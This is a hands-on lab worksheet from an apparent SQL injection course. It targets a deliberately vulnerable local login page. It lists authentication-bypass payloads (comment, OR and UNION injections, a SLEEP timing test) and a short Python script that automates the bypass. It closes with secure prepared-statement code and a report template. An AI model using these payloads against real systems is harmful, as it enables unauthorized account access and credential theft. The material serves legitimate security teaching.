# 🧪 Lab 1: Authentication Bypass

## 🎯 Objective

Learn to bypass login authentication using SQL injection techniques.

## 📝 Prerequisites

- Completed Chapters 1-4
- Local environment set up
- Database initialized
- Basic understanding of SQL syntax

## 🛠️ Required Tools

- Web browser (Chrome/Firefox recommended)
- Text editor for notes
- Browser DevTools (F12)

## 📚 Background

The vulnerable login page at `/vulnerable/login.php` contains a SQL injection vulnerability in the authentication logic. Your goal is to bypass the login without knowing valid credentials.

### Vulnerable Code

```php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

## ⚙️ Lab Setup

1. **Start your web server** (XAMPP/MAMP)
2. **Open the vulnerable login page:**
   ```
   http://localhost/SQLInjection-Academy/vulnerable/login.php
   ```
3. **Open browser DevTools** (F12) and go to Network tab

## 📖 Tasks

### Task 1: Single Quote Test

**Goal:** Verify SQL injection vulnerability exists

**Steps:**
1. Enter `'` in the username field
2. Enter anything in password field
3. Click Login
4. Observe the response

**Expected Result:**
- Database error message
- SQL syntax error visible
- Confirms vulnerability exists

**Document:**
```
Input: '
Result: [Your observation]
Query generated: [If visible in error]
Conclusion: [What this tells you]
```

### Task 2: Comment-Based Bypass

**Goal:** Bypass authentication using SQL comments

**Technique:** Use `--` to comment out the password check

**Try these payloads:**

#### Attempt 1
```
Username: admin' --
Password: (anything)
```

#### Attempt 2
```
Username: admin'--
Password: (anything)
```

#### Attempt 3
```
Username: admin' #
Password: (anything)
```

**Document each attempt:**
```
Payload: admin' --
Result: [Success/Fail]
Query generated: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
Explanation: [Why it worked or didn't work]
```

### Task 3: OR-Based Bypass

**Goal:** Use OR logic to make condition always true

**Technique:** Inject OR condition that evaluates to true

**Try these payloads:**

#### Attempt 1
```
Username: ' OR '1'='1
Password: ' OR '1'='1
```

#### Attempt 2
```
Username: ' OR 1=1 --
Password: (anything)
```

#### Attempt 3
```
Username: admin' OR '1'='1' --
Password: (anything)
```

**Analyze the results:**
```
Payload: ' OR '1'='1
Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1'
Why it works: [Your explanation]
Which user did you login as: [First user in database]
```

### Task 4: Targeted User Bypass

**Goal:** Login as a specific user without password

**Challenge:** Bypass authentication for 'admin' user specifically

**Try these payloads:**

```
Username: admin' OR '1'='1' --
Username: admin' AND '1'='1' --
Username: admin'='admin' --
```

**Document which worked and why.**

### Task 5: Multiple Users Enumeration

**Goal:** Identify multiple valid usernames

**Technique:** Use UNION to extract usernames

**Try:**
```
Username: ' UNION SELECT username, password, email, role, created_at FROM users --
Password: (anything)
```

**Alternative:**
```
Username: ' UNION SELECT CONCAT(username, ':', password), NULL, NULL, NULL, NULL FROM users --
Password: (anything)
```

## 📋 Lab Report Template

### Executive Summary
```
Lab: Authentication Bypass
Date: [Date]
Target: vulnerable/login.php
Vulnerability: SQL Injection
Severity: Critical

Summary:
[Brief description of what you discovered]
```

### Methodology
```
1. Reconnaissance:
   - [What you discovered about the target]

2. Exploitation:
   - [Techniques that worked]
   - [Payloads used]

3. Post-Exploitation:
   - [Access gained]
   - [Information extracted]
```

### Technical Findings

#### Vulnerability Details
```
Vulnerable Parameter: username, password
Injection Point: Login form
Database: MySQL
Vulnerable Query: SELECT * FROM users WHERE username='[INPUT]' AND password='[INPUT]'
```

#### Proof of Concept
```
Payload 1:
  Username: admin' --
  Password: anything
  Result: Successful bypass
  
Payload 2:
  Username: ' OR '1'='1
  Password: ' OR '1'='1
  Result: Logged in as first user
```

#### Impact Assessment
```
Severity: Critical

Impact:
- Complete authentication bypass
- Unauthorized access to all accounts
- Potential data theft
- Privilege escalation to admin

CVSS Score: 9.8 (Critical)
```

### Recommendations

```
1. Immediate Actions:
   - Implement prepared statements
   - Use parameterized queries
   - Never concatenate user input in SQL

2. Short-term:
   - Add input validation
   - Implement rate limiting
   - Add logging and monitoring

3. Long-term:
   - Security code review
   - Penetration testing
   - Security training for developers
   - Implement Web Application Firewall
```

### Remediation Example

**Vulnerable Code:**
```php
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
```

**Secure Code:**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows > 0) {
    $user = $result->fetch_assoc();
    if (password_verify($password, $user['password'])) {
        // Login successful
    }
}
```

## ✅ Success Criteria

You have successfully completed this lab when you can:

- [ ] Explain why the vulnerability exists
- [ ] Successfully bypass authentication using multiple techniques
- [ ] Login as a specific user without password
- [ ] Extract usernames using UNION
- [ ] Document all findings in a professional report
- [ ] Explain how to fix the vulnerability
- [ ] Implement a secure version

## 💡 Bonus Challenges

### Challenge 1: Alternative Payloads
Find 5 different working payloads that successfully bypass authentication.

### Challenge 2: Time-Based Detection
Modify your payload to cause a 5-second delay using `SLEEP(5)`.

### Challenge 3: Error-Based Extraction
Extract the database name using error-based SQL injection.

### Challenge 4: Automation
Write a Python script that automates the authentication bypass.

```python
import requests

url = "http://localhost/SQLInjection-Academy/vulnerable/login.php"

payloads = [
    "admin' --",
    "' OR '1'='1",
    "admin' OR '1'='1' --"
]

for payload in payloads:
    data = {"username": payload, "password": "test"}
    response = requests.post(url, data=data)
    if "Welcome" in response.text:
        print(f"Success with payload: {payload}")
```

## 📚 Additional Resources

- [OWASP Testing Guide - SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PortSwigger SQL Injection Lab](https://portswigger.net/web-security/sql-injection)
- [Course Chapter 4](../course/04-basic-techniques.md)

## 🔄 Next Lab

Once completed, proceed to:
- **[Lab 2: Data Extraction with UNION](lab2-data-extraction.md)**

---

**Remember:** Only practice on systems you own or have permission to test!

**Happy Hacking! 🎓**